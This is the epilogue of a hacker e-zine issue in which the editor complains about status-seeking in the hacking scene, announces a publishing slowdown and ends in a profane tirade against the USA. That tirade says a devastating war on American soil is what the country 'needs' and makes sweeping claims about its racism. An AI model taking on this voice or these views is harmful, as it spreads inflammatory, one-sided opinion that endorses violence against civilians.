cheese. And even in the higher ranks of the hacking scene, where everything is
supposed to be different - it's the same old shit. How many people will fight
to be the new editor of Phrack when route retires (or when some-one finally
kills him :P), not because they have a vision for Phrack's future, or because 
they have a good style of writing, or because they *honestly* believe they 
could do a better job than the other candidates, but because they want to be 
the Editor of PHRACK and thus ELITE.

I want to hack. Not break into systems, Not look cool on IRC, Not kiss ass to
get into "leet hacker groups", I want to HACK: to play around with stuff on my
system, learn how things work better, try out new ideas just for the sake of
trying out new things: without any extra "culture" bullshit. As soon as I
finish writing this epilogue, I want to take a stab at using the JNI to have
Java-controlled low-level packet creation. I want to audit every daemon on
Tucows, find all the buffer overflow bugs I can, code exploits for them, and
then delete thce exploits as soon as I get them to work! I want to do 
pointless arb shit that will benefit me and nobody else, and never apply
anything practically, just for the sake of extra arbness. ;P

Fuck Subculture. What a dumb idea. :) And while we're at it, fuck culture,
it's also just another obstacle in the way of individualism. And finally, fuck
YOU: For being in a subculture, for reading this zine instead of finding out
stuff yourself (which will prob be better anyway) and (most importantly) for
not sending me free beer. :P

And so, as you can imagine, I've had a great deal of trouble deciding wether
or not to stay "in" the scene, wether or not to continue Forbidden Knowledge
and wether or not to just drop my current handle and move on. And ultimately
I've decided: No, I haven't changed the opinions of enough people to call it
quits just yet. I was gonna drop out of the scene totally, but talking about
it with NtWaK0 and Moe1 and re-reading my own cyberpunk.txt from FK4 changed
my mind. I'm still, however, going to carry on with my new idea of just 
screwing around with stuff that interests me and not necesarilly taking time
to implement all my ideas, whilst keeping a minimal connection with "the 
scene", which means that FK *will* continue, although it will probably be 
less orderly, more abstract and won't explain as much to the newbie reader 
sector. But that doesn't really matter - I'm not terribly fond of any form
of order what-so-ever, and the newbies will just have to go and get smarter
or something. :) Oh yeh, I also might wander off what many of you would call
"hacking" more often, but if you don't *still* call what I'm covering 
hacking, yer probably not the kind of reader we want anyway.

Also, through-out most of 2000 and early 2001, there is going to be somewhat
of an FK go-slow. I have a lot of things ahead of me: my final year of school,
and starting the company Pneuma and I want to get running in 2001. Also, much
of 2000 will be devoted to developing the AI that our company will be selling
- so my schedule is quite packed. Ultimately, the more articles I get, the
less the go-slow will be noticed. And if I get enough articles (as I did with
this issue for a change :P), you probably won't even notice.

Yeap, a year has gone by and there are some things that need to be changed,
but I think we grew pretty well. Also note that as from sometime early next
year, all feedback and article submissions should be sent to my new addy,
which will be wyze1@sexdrugsunix.org

So FK will probably continue until about 2025 when World War 3 breaks out, y0.
Heh, I can see it now: The USA vs Everybody else on the planet. :-P But thats
cool - I'd love having the opportunity to re-build society once its been
nuked to oblivion and I also think that a war like that is *exactly* what the
USA needs to slap some sense into it. Think about it: they are constantly
"saving" other countries from attack, but they have never been attacked on
their *own* land, had people come into *their* house, waste *their* kids and
rape *their* wives. And I think that's what they need to realize exactly what
they're doing to other people.

Look at the undeclared war between South Africa and Angola in the seventies -
I'm sure one in every 5 South African readers knows somebody who died in that
war. Now, it is publically admitted that the war happened, and that actually,
the war was between the USA and Cuba, each supplying SA and Angola
respectively with equipment - Yes, it was the USA valiantly bashing those
horrible commie scum again. Go Fucking Go. But the point is - the issue of the
war is in the open now - South Africa admits to it, Angola admits to it, Cuba
admits to it, and the USA... *still* denies that they were responsible for
MORE death in OTHER people's countries.

I am sorry, but America is the fucking *king* of hypocrisy: "Ooh, look at all
the racist South African scum, what a crap country!" Hello?!! HOW many Native
Americans are in powerful positions in the USA? Hmm.. *I* don't know of any -
Perhaps that could be because they WASTED 90% of them a hundred years ago, and
those that we *DO* have we treat like *SHIT*. So children, *learn* from
America's wisdom - don't discriminate, kill. *Sigh* What a crock of shit. The
USA is probably one of THE most racist countries around. The fucking mixed
marriages act is still in place in Alabama, The USA has *never* had anything
*but* a white president, and ultimately, when it comes down to being *nice* 
to and *respecting* other races, attitudes in SA are FAR less anal retensive. 

I could go on for ages about other reasons why America can suck my dick, like
the fact that the US hacking scene think everything revolves around them and
them only, but I won't. I've wasted too much space with this weird
stream-of-conscious epilogue already, and just the thought of having to
mention *that* country or *that* lame subculture one more time makes me 
nauseous. Peace...
